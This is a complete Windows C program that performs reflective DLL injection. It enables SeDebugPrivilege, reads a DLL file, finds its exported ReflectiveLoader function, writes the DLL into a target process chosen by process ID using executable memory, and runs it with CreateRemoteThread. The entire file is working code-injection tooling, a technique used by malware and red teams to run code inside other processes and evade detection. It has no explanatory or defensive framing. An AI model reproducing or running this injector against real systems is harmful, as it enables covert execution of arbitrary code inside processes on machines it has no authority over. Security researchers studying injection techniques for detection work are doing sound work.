#include <Windows.h>
#include <stdio.h>

#pragma comment(linker, "/subsystem:console")

#define DEREF( name )*(UINT_PTR *)(name)
#define DEREF_64( name )*(DWORD64 *)(name)
#define DEREF_32( name )*(DWORD *)(name)
#define DEREF_16( name )*(WORD *)(name)
#define DEREF_8( name )*(BYTE *)(name)

DWORD Rva2Offset(DWORD dwRva, UINT_PTR uiBaseAddress)
{
	WORD wIndex = 0;
	PIMAGE_SECTION_HEADER pSectionHeader = NULL;
	PIMAGE_NT_HEADERS pNtHeaders = NULL;

	pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);

	pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders->OptionalHeader) + pNtHeaders->FileHeader.SizeOfOptionalHeader);

	if (dwRva < pSectionHeader[0].PointerToRawData)
		return dwRva;

	for (wIndex = 0; wIndex < pNtHeaders->FileHeader.NumberOfSections; wIndex++)
	{
		if (dwRva >= pSectionHeader[wIndex].VirtualAddress && dwRva < (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData))
			return (dwRva - pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].PointerToRawData);
	}

	return 0;
}

BOOL IsPathValidW(PWCHAR FilePath)
{
	HANDLE hFile = INVALID_HANDLE_VALUE;

	hFile = CreateFileW(FilePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;

	if (hFile)
		CloseHandle(hFile);

	return TRUE;
}

BOOL RtlAdjustModuleToken(VOID)
{
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES Token = { 0 };

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return FALSE;

	Token.PrivilegeCount = 1;
	Token.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &Token.Privileges[0].Luid))
		AdjustTokenPrivileges(hToken, FALSE, &Token, 0, NULL, NULL);

	CloseHandle(hToken);

	return TRUE;
}

BOOL RtlLoadDllData(PWCHAR Path, LPVOID *lpBuffer, PDWORD DataSize)
{
	HANDLE hFile = INVALID_HANDLE_VALUE;
	DWORD dwSize = 0;
	DWORD dwBytesRead = 0;
	BOOL bFlag = FALSE;

	hFile = CreateFileW(Path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		goto EXIT_ROUTINE;

	dwSize = GetFileSize(hFile, NULL);
	if (dwSize == INVALID_FILE_SIZE || dwSize == 0)
		goto EXIT_ROUTINE;

	*lpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
	if (*lpBuffer == NULL)
		goto EXIT_ROUTINE;

	if (!ReadFile(hFile, *lpBuffer, dwSize, &dwBytesRead, NULL))
		goto EXIT_ROUTINE;

	*DataSize = dwBytesRead;

	bFlag = TRUE;

EXIT_ROUTINE:

	if (hFile)
		CloseHandle(hFile);

	return bFlag;
}

DWORD GetReflectiveLoaderOffset(VOID* lpReflectiveDllBuffer)
{
	UINT_PTR uiBaseAddress = 0;
	UINT_PTR uiExportDir = 0;
	UINT_PTR uiNameArray = 0;
	UINT_PTR uiAddressArray = 0;
	UINT_PTR uiNameOrdinals = 0;
	DWORD dwCounter = 0;
	DWORD dwCompiledArch = 2;


	uiBaseAddress = (UINT_PTR)lpReflectiveDllBuffer;

	uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

	if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x010B) // PE32
	{
		if (dwCompiledArch != 1)
			return 0;
	}
	else if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x020B) // PE64
	{
		if (dwCompiledArch != 2)
			return 0;
	}
	else
		return 0;

	uiNameArray = (UINT_PTR) & ((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

	uiExportDir = uiBaseAddress + Rva2Offset(((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress, uiBaseAddress);

	uiNameArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNames, uiBaseAddress);

	uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions, uiBaseAddress);

	uiNameOrdinals = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNameOrdinals, uiBaseAddress);

	dwCounter = ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->NumberOfNames;

	while (dwCounter--)
	{
		char* cpExportedFunctionName = (char*)(uiBaseAddress + Rva2Offset(DEREF_32(uiNameArray), uiBaseAddress));

		if (strstr(cpExportedFunctionName, "ReflectiveLoader") != NULL)
		{
			uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions, uiBaseAddress);

			uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));

			return Rva2Offset(DEREF_32(uiAddressArray), uiBaseAddress);
		}
		uiNameArray += sizeof(DWORD);

		uiNameOrdinals += sizeof(WORD);
	}

	return 0;
}

HANDLE RtlReflectiveLoadModule(HANDLE hProcess, LPVOID lpBuffer, DWORD dwSize)
{
	DWORD dwOffset = 0, dwThreadId = 0;
	LPVOID lpRemoteLibraryBuffer = NULL;
	LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
	HANDLE hThread = NULL;

	dwOffset = GetReflectiveLoaderOffset(lpBuffer);
	if (dwOffset == 0)
		return NULL;

	lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, dwSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!lpRemoteLibraryBuffer)
		return NULL;

	if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpBuffer, dwSize, NULL))
		return NULL;

	lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpRemoteLibraryBuffer + dwOffset);

	hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, lpReflectiveLoader, NULL, (DWORD)NULL, &dwThreadId);
	if (hThread == NULL)
		return NULL;

	return hThread;
}

int wmain(INT argc, PWCHAR argv[])
{
	DWORD dwError = ERROR_SUCCESS, dwProcessId = 0, dwSize = 0;
	BOOL bFlag = FALSE;
	PWCHAR BinaryPath = NULL;
	LPVOID lpBuffer = NULL;
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;

	if (argc == 1)
		goto EXIT_ROUTINE;
	else
		dwProcessId = _wtoi(argv[1]);

	BinaryPath = argv[2];

	if (!IsPathValidW(BinaryPath))
		goto EXIT_ROUTINE;

	RtlAdjustModuleToken(); //possibly not fatal?

	if (!RtlLoadDllData(BinaryPath, &lpBuffer, &dwSize))
		goto EXIT_ROUTINE;

	hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);
	if (hProcess == NULL)
		goto EXIT_ROUTINE;

	hThread = RtlReflectiveLoadModule(hProcess, lpBuffer, dwSize);
	if (hThread == NULL)
		goto EXIT_ROUTINE;

	WaitForSingleObject(hThread, INFINITE);

	bFlag = TRUE;

EXIT_ROUTINE:

	if (lpBuffer)
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, lpBuffer);

	if (!bFlag)
		dwError = GetLastError();

	return dwError;
}
